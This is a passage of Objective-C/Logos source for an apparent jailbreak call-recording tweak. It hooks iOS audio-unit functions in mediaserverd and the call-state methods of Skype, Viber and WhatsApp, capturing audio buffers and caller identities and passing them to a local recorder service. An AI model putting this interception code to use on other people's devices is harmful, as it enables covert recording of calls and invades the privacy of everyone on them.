    if (isRecording == 0) {
        return o_AudioUnitRender(inUnit, ioActionFlags, inTimeStamp, inOutputBusNumber, inNumberFrames, ioData);
    }
    
    OSStatus status = o_AudioUnitRender(inUnit, ioActionFlags, inTimeStamp, inOutputBusNumber, inNumberFrames, ioData);
//    NSLog(@"r_AudioUnitRender: %d", status);
    
    if (status == noErr && appMode == 1) {
        bool writed = false;
        
        for (int i=0; i < MAXFILE; i++) {
            if (FILES[i].a == (NSInteger)inUnit) {
                if (FILES[i].b == 0) {
                    send_audio_buffers(i, fifo_fd, (NSInteger)inUnit, ioData, inNumberFrames);
                }
                writed = true;
                break;
            }
        }
        
        if (writed == false) {
            for (int i=0; i < MAXFILE; i++) {
                if (FILES[i].a == 0) {
                    
                    AudioStreamBasicDescription inDestinationFormat;
                    NSInteger size = sizeof(inDestinationFormat);
                    
                    OSStatus result = AudioUnitGetProperty (inUnit, kAudioUnitProperty_StreamFormat, kAudioUnitScope_Output, 0/*1*/,  &inDestinationFormat, (UInt32 *)&size);
                    
                    CFStringRef AUName = nil;
                    OSStatus result1 = AudioComponentCopyName((AudioComponent)inUnit, &AUName);
                    
                    NSLog(@"[-----------{AudioUnitRender}-----------]");
                    NSLog(@"-----> OS result: %d, %d", result, result1);
                    NSLog(@"-----> Audio Unit: 0x%x", inUnit);
                    NSLog(@"-----> Audio Unit name: %@", AUName);
                    NSLog(@"-----> Sample rate: %lf", inDestinationFormat.mSampleRate);
                    NSLog(@"-----> Format ID: 0x%x", inDestinationFormat.mFormatID);
                    NSLog(@"-----> Format Flag: 0x%x", inDestinationFormat.mFormatFlags);
                    NSLog(@"-----> BPP: %d", inDestinationFormat.mBytesPerPacket);
                    NSLog(@"-----> FPP: %d", inDestinationFormat.mFramesPerPacket);
                    NSLog(@"-----> BPF: %d", inDestinationFormat.mBytesPerFrame);
                    NSLog(@"-----> CPF: %d", inDestinationFormat.mChannelsPerFrame);
                    NSLog(@"-----> BPC: %d", inDestinationFormat.mBitsPerChannel);
                    NSLog(@"[-----------{AudioUnitRender}-----------]");
                    
                    CFRelease(AUName);
                    
                    if (inDestinationFormat.mFormatID != kAudioFormatLinearPCM) {
                        FILES[i].a = (NSInteger)inUnit;
                        FILES[i].b = -1;
                        FILES[i].c = -1;
                        break;
                    }
                    
                    for (int i=0; i < MAXFILE; i++) {
                        if (FILES[i].a == 0) {
                            
                            UInt64 timestamp = CFAbsoluteTimeGetCurrent()*1000;
                            send_packet_timestamp(i, fifo_fd, 200, (NSInteger)inUnit, (unsigned char *)(&inDestinationFormat), sizeof(inDestinationFormat), timestamp);
                            
                            FILES[i].a = (NSInteger)inUnit;
                            FILES[i].b = 0;
                            FILES[i].c = 0;
                            
                            send_audio_buffers(i, fifo_fd, (NSInteger)inUnit, ioData, inNumberFrames);
                            
                            break;
                        }
                    }
                    
                    break;
                }
            }
        }
    }
    return status;
}

OSStatus r_AudioUnitProcess(AudioUnit inUnit, AudioUnitRenderActionFlags *ioActionFlags, const AudioTimeStamp *inTimeStamp, UInt32 inNumberFrames, AudioBufferList *ioData) {
    if (!isRecording) {
        return o_AudioUnitProcess(inUnit, ioActionFlags, inTimeStamp, inNumberFrames, ioData);
    }
    
    OSStatus status = o_AudioUnitProcess(inUnit, ioActionFlags, inTimeStamp, inNumberFrames, ioData);
//    NSLog(@"o_AudioUnitProcess: %d", status);
    
    bool desiredSubType = false;
    AudioComponentDescription unitDescription = {0};
    AudioComponentGetDescription((AudioComponent)AudioComponentInstanceGetComponent(inUnit), &unitDescription);
    //'agcc', 'mbdp' - iPhone 4S, iPhone 5
    //'agc2', 'vrq2' - iPhone 5C, iPhone 5S
    if (unitDescription.componentSubType == 'agcc' || unitDescription.componentSubType == 'agc2')
    {
        kAudioUnitSubType_RemoteIO;
        desiredSubType = true;
    }
    else if (unitDescription.componentSubType == 'mbdp' || unitDescription.componentSubType == 'vrq2')
    {
        desiredSubType = true;
    }
    
//    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
//        NSLog(@"unitDescription.componentSubType: %s", FourCC2Str(unitDescription.componentSubType));
//    });
    
    if (status == noErr && appMode == 1 && desiredSubType) {
        bool writed = false;
        
        for (int i=0; i < MAXFILE; i++) {
            if (FILES[i].a == (NSInteger)inUnit) {
                if (FILES[i].b == 0) {
                    send_audio_buffers(i, fifo_fd, (NSInteger)inUnit, ioData, inNumberFrames);
                }
                writed = true;
                break;
            }
        }
        
        if (writed == false) {
            for (int i=0; i < MAXFILE; i++) {
                if (FILES[i].a == 0) {
                    
                    AudioStreamBasicDescription inDestinationFormat;
                    NSInteger size = sizeof(inDestinationFormat);
                    
                    OSStatus result = AudioUnitGetProperty (inUnit, kAudioUnitProperty_StreamFormat, kAudioUnitScope_Output, 0/*1*/,  &inDestinationFormat, (UInt32 *)&size);
                    
                    CFStringRef AUName = nil;
                    OSStatus result1 = AudioComponentCopyName((AudioComponent)inUnit, &AUName);
                    
                    NSLog(@"[-----------{AudioUnitProcess}-----------]");
                    NSLog(@"-----> OS result: %d, %d", result, result1);
                    NSLog(@"-----> Audio Unit: 0x%x", inUnit);
                    NSLog(@"-----> Audio Unit name: %@", AUName);
                    NSLog(@"-----> Sample rate: %lf", inDestinationFormat.mSampleRate);
                    NSLog(@"-----> Format ID: 0x%x", inDestinationFormat.mFormatID);
                    NSLog(@"-----> Format Flag: 0x%x", inDestinationFormat.mFormatFlags);
                    NSLog(@"-----> BPP: %d", inDestinationFormat.mBytesPerPacket);
                    NSLog(@"-----> FPP: %d", inDestinationFormat.mFramesPerPacket);
                    NSLog(@"-----> BPF: %d", inDestinationFormat.mBytesPerFrame);
                    NSLog(@"-----> CPF: %d", inDestinationFormat.mChannelsPerFrame);
                    NSLog(@"-----> BPC: %d", inDestinationFormat.mBitsPerChannel);
                    NSLog(@"[-----------{AudioUnitProcess}-----------]");
                    
                    CFRelease(AUName);
                    
                    if (inDestinationFormat.mFormatID != kAudioFormatLinearPCM) {
                        FILES[i].a = (NSInteger)inUnit;
                        FILES[i].b = -1;
                        FILES[i].c = -1;
                        break;
                    }
                    
                    for (int i=0; i < MAXFILE; i++) {
                        if (FILES[i].a == 0) {
                            
                            UInt64 timestamp = CFAbsoluteTimeGetCurrent()*1000;
                            send_packet_timestamp(i, fifo_fd, 200, (NSInteger)inUnit, (unsigned char *)(&inDestinationFormat), sizeof(inDestinationFormat), timestamp);
                            
                            FILES[i].a = (NSInteger)inUnit;
                            FILES[i].b = 0;
                            FILES[i].c = 0;
                            
                            send_audio_buffers(i, fifo_fd, (NSInteger)inUnit, ioData, inNumberFrames);
                            
                            break;
                        }
                    }
                    
                    break;
                }
            }
        }
    }
    return status;
}

static OSStatus inputCallback (void*inRefCon, AudioUnitRenderActionFlags* ioActionFlags, const AudioTimeStamp* inTimeStamp, UInt32 inOutputBusNumber, UInt32 inNumberFrames, AudioBufferList* ioData)
{
    if (inRefCon == NULL) {
        return 0;
    }
    EFI *d = (EFI *)inRefCon;
    AURenderCallback callback = (AURenderCallback) d->c;
    if (callback == NULL) {
        return 0;
    }
    
    OSStatus status = callback((void *)d->b, ioActionFlags, inTimeStamp, inOutputBusNumber, inNumberFrames, ioData);
//    NSLog(@"inputCallback: %d", status);
    
    if (isRecording && ioData != NULL) {
        AudioUnit inUnit = (AudioUnit)d->a;
        UInt32 hash = ((NSInteger)inUnit * 16) | (d->d * 8) | (d->e);
        if (status == noErr && appMode == 1) {
            bool writed = false;
            
            for (int i=0; i < MAXFILE; i++) {
                if (FILES[i].a == hash) {
                    if (FILES[i].b == 0) {
                        send_audio_buffers (i, fifo_fd, (NSInteger)hash, ioData, inNumberFrames);
                    }
                    writed = true;
                    break;
                }
            }
            
            if (writed == false) {
                for (int i=0; i < MAXFILE; i++) {
                    if (FILES[i].a == 0) {
                        
                        AudioStreamBasicDescription inDestinationFormat;
                        NSInteger size = sizeof(inDestinationFormat);
                        
                        AudioUnitGetProperty (inUnit, kAudioUnitProperty_StreamFormat, kAudioUnitScope_Input, 0,  &inDestinationFormat, (UInt32 *)&size);
                        
                        if (size == 0 || inDestinationFormat.mFormatID != kAudioFormatLinearPCM) {
                            if (size > 0) {
                                NSLog(@"===> Format: %d", inDestinationFormat.mFormatID);
                            }
                            FILES[i].a = hash;
                            FILES[i].b = -1;
                            FILES[i].c = -1;
                            break;
                        }
                        
                        for (int i=0; i < MAXFILE; i++) {
                            if (FILES[i].a == 0) {
                                
                                UInt64 timestamp = CFAbsoluteTimeGetCurrent()*1000;
                                
                                send_packet_timestamp(i, fifo_fd, 200, (NSInteger)hash, (unsigned char *)(&inDestinationFormat), sizeof(inDestinationFormat), timestamp);
                                
                                FILES[i].a = (NSInteger)hash;
                                FILES[i].b = 0;
                                FILES[i].c = 0;
                                
                                send_audio_buffers (i, fifo_fd, (NSInteger)hash, ioData, inNumberFrames);
                                
                                break;
                            }
                        }
                        
                        break;
                    }
                }
            }
        }
    }
    return status;
}

OSStatus r_AudioUnitSetProperty ( AudioUnit inUnit, AudioUnitPropertyID inID, AudioUnitScope inScope, AudioUnitElement inElement, const void *inData,UInt32 inDataSize)
{
    NSLog(@"====> SetProperty [%x, %d, %d, %d]", inUnit, inID, inScope, inElement);
    if ((inID == kAudioUnitProperty_SetRenderCallback) && inData != NULL) {
        
        if (units == NULL) {
            units = dyna_init();
        }
        EFI *d = (EFI *) malloc(sizeof(EFI));
        d->a = 0;
        d->b = 0;
        d->c = 0;
        d->d = 0;
        d->e = 0;
        d->f = 0;
        d->g = 0;
        AURenderCallbackStruct *data = (AURenderCallbackStruct *) inData;
        d->a = (NSInteger) inUnit;
        d->b = (NSInteger) data->inputProcRefCon;
        d->c = (NSInteger) data->inputProc;
        d->d = (NSInteger) inScope;
        d->e = (NSInteger) inElement;
        d->f = (NSInteger) inID;
        dyna_push(units, d);
        
        data->inputProc = inputCallback;
        data->inputProcRefCon = d;
        
        NSLog(@"====> New input callback [%x, %d, %d, %d, %x, %x]", inUnit, inID, inScope, inElement, data->inputProc, data->inputProcRefCon);
        
    }
    
    OSStatus result = o_AudioUnitSetProperty(inUnit, inID, inScope, inElement, inData, inDataSize);
//    NSLog(@"r_AudioUnitSetProperty: %d", result);
    return result;
}

OSStatus r_AudioUnitUninitialize (AudioUnit  inUnit)
{
    OSStatus result = o_AudioUnitUninitialize(inUnit);
//    NSLog(@"r_AudioUnitUninitialize: %d", result);
    return result;
}

OSStatus r_AudioConverterNew ( const AudioStreamBasicDescription *inSourceFormat, const AudioStreamBasicDescription *inDestinationFormat, AudioConverterRef _Nullable *outAudioConverter )
{
    OSStatus result = o_AudioConverterNew(inSourceFormat, inDestinationFormat, outAudioConverter);
//    NSLog(@"r_AudioConverterNew: %d", result);
    return result;
}

/**** End of mediaserverd hook methods ****/

#pragma mark - Skype -
/**** Skype ****/

%group Skype_group

%hook SKPCall

- (void)setCallState:(NSInteger)arg1
{
    NSLog(@"---> Skype: Call Direction[%d]", arg1);
    
    %orig;
    
    if (SKYPE_RECORDING)
    {
        NSString *number = @"";
        id sk = [[self conversation] otherConsumers];
        for(int i=0; i< [sk count]; i++)
        {
            number = [number stringByAppendingFormat:@"{%@}", [[sk objectAtIndex:i] identity]];
        }
        
        NSLog(@"===> numbers1: %@ %d", number, [self isInbound]);
        
        if (arg1 == 2)
        {
            number = [number stringByReplacingOccurrencesOfString:@"_" withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"." withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"{" withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"}" withString:@""];
            
            NSString *direction = @"outgoing";
            if ([self isInbound])
            {
                direction = @"incoming";
            }
            
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", direction, @"direction",[[SoundRecorderInstance fileURL] absoluteString], @"fileURL", nil] options:nil error:NULL]];
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else
            {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", @"incoming", @"direction", nil]];
            }
            
            //            [SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", @"incoming", @"direction", nil]];
            
        }
        else if (arg1 == 8 || arg1 == 9)
        {
            
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
            }
            
            //            [SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
        }
        
    }
}

%end

%hook SKPCallViewController

- (void)transitionToCallState:(NSInteger)arg1
{
    NSLog(@"---> Skype: Call Direction[%d]", arg1);
    
    %orig;
    
    if (SKYPE_RECORDING)
    {
        NSString *number = @"";
        id sk = [[[self call] conversation] otherConsumers];
        for(int i=0; i< [sk count]; i++)
        {
            number = [number stringByAppendingFormat:@"{%@}", [[sk objectAtIndex:i] identity]];
        }
        
        NSLog(@"===> numbers2: %@ %@", number, [self call]);
        
        if (arg1 == 2)
        {
            number = [number stringByReplacingOccurrencesOfString:@"_" withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"." withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"{" withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"}" withString:@""];
            
            NSString *direction = @"outgoing";
            if ([[self call] isInbound])
            {
                direction = @"incoming";
            }
            
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", direction, @"direction",[[SoundRecorderInstance fileURL] absoluteString], @"fileURL", nil] options:nil error:NULL]];
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else
            {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", @"incoming", @"direction", nil]];
            }
            
            //            [SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", @"incoming", @"direction", nil]];
            
        }
        else if (arg1 == 8 || arg1 == 9)
        {
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
            }
            
            //            [SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
        }
        
    }
}

%end

%hook SKCallController

- (void)transitionToCallState:(NSInteger)arg1
{
    NSLog(@"---> Skype: Call Direction[%d][%d]", arg1, [[self callState] isInbound]);
    
    %orig;
    
    if (SKYPE_RECORDING)
    {
        NSString *number = @"";
        id sk = [[self conversation] participants];
        for(int i=0; i< [sk count]; i++)
        {
            if ([[sk objectAtIndex:i] isMyself] == NO)
            {
                number = [number stringByAppendingFormat:@"{%@}", [[sk objectAtIndex:i] identity]];
            }
        }
        
        if (arg1 == 2)
        {
            number = [number stringByReplacingOccurrencesOfString:@"_" withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"." withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"{" withString:@""];
            number = [number stringByReplacingOccurrencesOfString:@"}" withString:@""];
            
            NSString *direction = @"outgoing";
            if ([[self callState] isInbound])
            {
                direction = @"incoming";
            }
            
            [SoundRecorderInstance tmpStartRecorder];
            
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", direction, @"direction",[[SoundRecorderInstance fileURL] absoluteString], @"fileURL", nil] options:nil error:NULL]];
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else
            {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", @"incoming", @"direction", nil]];
            }
            
            //            [SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", number, @"number", @"skype", @"app", @"incoming", @"direction", nil]];
            
        }
        else if (arg1 == 8)
        {
            
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
            }
            
            //            [SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
        }
        
    }
}

%end

%end

/**** End of Skype ****/

#pragma mark - Viber -
/**** Viber ****/

%group Viber_group

%hook CallInfo

- (void)onEnded
{
    %orig;
    if (VIBER_RECORDING)
    {
        NSLog(@"---> Viber Call [onEnded]: %@", [self performSelector:NSSelectorFromString(@"number")]);
        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
        {
            NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
            [urlRequest setHTTPMethod:@"POST"];
            [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
            NSURLResponse * response = nil;
            NSError * error = nil;
            NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
            NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
        }
        else
        {
            id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
            NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
        }
        //[SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
    }
}
- (void)onStarted
{
    %orig;
    
    if (VIBER_RECORDING)
    {
        NSLog(@"---> Viber Call [onStarted]: %@", [self performSelector:NSSelectorFromString(@"number")]);
        
        NSString *direction = @"incoming";
        if ([self isIncoming] == NO) direction = @"outgoing";
        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
        {
            NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
            [urlRequest setHTTPMethod:@"POST"];
            [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"viber", @"app", [self performSelector:NSSelectorFromString(@"number")], @"number", direction, @"direction", nil] options:nil error:NULL]];
            NSURLResponse * response = nil;
            NSError * error = nil;
            NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
            NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
        }
        else
        {
            id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
            NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"viber", @"app", [self performSelector:NSSelectorFromString(@"number")], @"number", direction, @"direction", nil]];
        }
        //[SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"viber", @"app", [self number], @"number", direction, @"direction", nil]];
    }
}
%end

%hook VIBCallInfo

- (void)onEnded
{
    %orig;
    if (VIBER_RECORDING)
    {
        
        NSString *path = [[SoundRecorderInstance fileURL] relativePath];
        NSLog(@"---> Viber Call [onEnded]: %@", [self performSelector:NSSelectorFromString(@"number")], path);
        
        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
        {
            NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
            [urlRequest setHTTPMethod:@"POST"];
            [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil] options:nil error:NULL]];
            NSURLResponse * response = nil;
            NSError * error = nil;
            NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
            NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
        }
        else
        {
            id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
            NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"stop", @"cmd", nil]];
        }
    }
}
- (void)onStarted
{
    %orig;
    
    if (VIBER_RECORDING)
    {
        NSLog(@"---> Viber Call [onStarted]: %@", [self number]);
        
        NSString *direction = @"incoming";
        if ([self isIncoming] == NO) direction = @"outgoing";
        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
        {
            NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
            [urlRequest setHTTPMethod:@"POST"];
            [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"viber", @"app", [self number], @"number", direction, @"direction", [[SoundRecorderInstance fileURL] absoluteString], @"fileURL",  nil] options:nil error:NULL]];
            NSURLResponse * response = nil;
            NSError * error = nil;
            NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
            NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
        }
        else
        {
            id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
            NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"viber", @"app", [self number], @"number", direction, @"direction", nil]];
        }
    }
}
%end

%end

/**** End of Viber ***/
#pragma mark - WhatsApp -
/**** Whatsapp ***/

%group WhatsApp_group

extern Ivar object_getInstanceVariable ( id obj, const char *name, void **outValue);

%hook WAVoiceCallViewController

- (void)setCallState:(int)arg1 animated:(_Bool)arg2
{
    %orig;
    if (arg1 == 5) {
        int _isIncomingCall = 0;
        object_getInstanceVariable(self, "_isIncomingCall", (void**)&_isIncomingCall);
        
        Ivar ivar = class_getInstanceVariable([self class], "_isIncomingCall");
        ptrdiff_t offset = ivar_getOffset(ivar);
        unsigned char* bytes = (unsigned char *)(__bridge void*)self;
        bool isIncomingWACall = *((bool *)(bytes+offset));
        
        NSLog(@"_isIncomingCall: %d, isIncomingWACall: %d", _isIncomingCall, isIncomingWACall);
        
        NSString *phoneNumber = [[[[objc_getClass("CallManager") sharedManager] peerJid] componentsSeparatedByString:@"@"] firstObject];
        
        if (WHATSAPP_RECORDING)
        {
            NSLog(@"===> *** New Whatsapp Call ***");
            NSString *direction = @"incoming";
            //if (_isIncomingCall == NO) direction = @"outgoing";
            if (!isIncomingWACall) direction = @"outgoing";
            
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
                [urlRequest setHTTPBody:[NSJSONSerialization dataWithJSONObject:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"whatsapp", @"app", phoneNumber, @"number", direction, @"direction",[[SoundRecorderInstance fileURL] absoluteString], @"fileURL", nil] options:nil error:NULL]];
                NSURLResponse * response = nil;
                NSError * error = nil;
                NSData * data = [NSURLConnection sendSynchronousRequest:urlRequest returningResponse:&response error:&error];
                NSLog(@">>> Tracer %@", [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);
            }
            else
            {
                id messagingCenter = [objc_getClass("CPDistributedMessagingCenter") centerNamed:@"com.timecompiler.recorder"];
                NSDictionary *dic = [messagingCenter sendMessageAndReceiveReplyName:@"call" userInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"whatsapp", @"app", phoneNumber, @"number", direction, @"direction", nil]];
            }
        }
        //[SoundRecorderInstance handleMessageNamed:@"call" withUserInfo:[NSDictionary dictionaryWithObjectsAndKeys:@"start", @"cmd", @"viber", @"app", [self number], @"number", direction, @"direction", nil]];
    }
    else if (arg1 == 6) {
        
        if (WHATSAPP_RECORDING)
        {
            if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"7.0"))
            {
                NSMutableURLRequest * urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://127.0.0.1:30301/start"]];
                [urlRequest setHTTPMethod:@"POST"];
